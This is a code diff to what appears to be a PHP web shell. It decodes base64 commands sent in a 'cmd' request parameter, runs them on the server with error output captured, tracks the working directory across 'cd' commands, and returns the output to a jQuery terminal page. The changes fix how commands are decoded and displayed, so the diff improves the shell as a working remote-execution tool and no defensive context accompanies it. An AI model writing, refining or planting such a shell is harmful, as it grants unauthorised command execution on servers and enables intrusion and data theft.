@@ -150,7 +150,7 @@ if (!empty($_SESSION['pwd'])) {
 }
 
 if (isset($_REQUEST['cmd'])) {
-    $REQUESTED_CMD = trim($_REQUEST['cmd']);
+    $REQUESTED_CMD = trim(base64_decode($_REQUEST['cmd']));
     if (empty($REQUESTED_CMD)) {
         exit(0);
     }
@@ -172,8 +172,8 @@ if (isset($_REQUEST['cmd'])) {
         session_destroy();
         exit(0);
     }
-    if (substr($_REQUEST['cmd'], 0, 3) === 'cd ') {
-        $dir = substr($_REQUEST['cmd'], 3);
+    if (substr($REQUESTED_CMD, 0, 3) === 'cd ') {
+        $dir = substr($REQUESTED_CMD, 3);
         $dir = realpath($dir);
         if (chdir($dir)) {
             $_SESSION['pwd'] = $dir;
@@ -181,7 +181,7 @@ if (isset($_REQUEST['cmd'])) {
         }
     }
 
-    $output = execute_command(base64_decode($_REQUEST['cmd']) . ' 2>&1');
+    $output = execute_command($REQUESTED_CMD . ' 2>&1');
     output_json(base64_encode($output));
 }
 
@@ -322,16 +322,10 @@ if (isset($_REQUEST['cmd'])) {
                     return;
                 }
                 command = Base64.encode(command);
+                $('#stdout').append($('#pwd').html() + " " + Base64.decode(command) + "\n");
                 $.post(this.script_path, {cmd: command}, function(data) {
-                    if (data.stdout) {
-                        $('#stdout').append(data.banner + " " + Base64.decode(command) + "\n");
-                        if (data.stdout !== null) {
-                            $('#stdout').append(Base64.decode(data.stdout));
-                        }
-                        $('#pwd').html(data.banner);
-                    } else {
-                        $('#stdout').append(data);
-                    }
+                    $('#stdout').append(Base64.decode(data.stdout));
+                    $('#pwd').html(data.banner);
                     $('#stdout').scrollTop($('#stdout')[0].scrollHeight);
                 });
             }
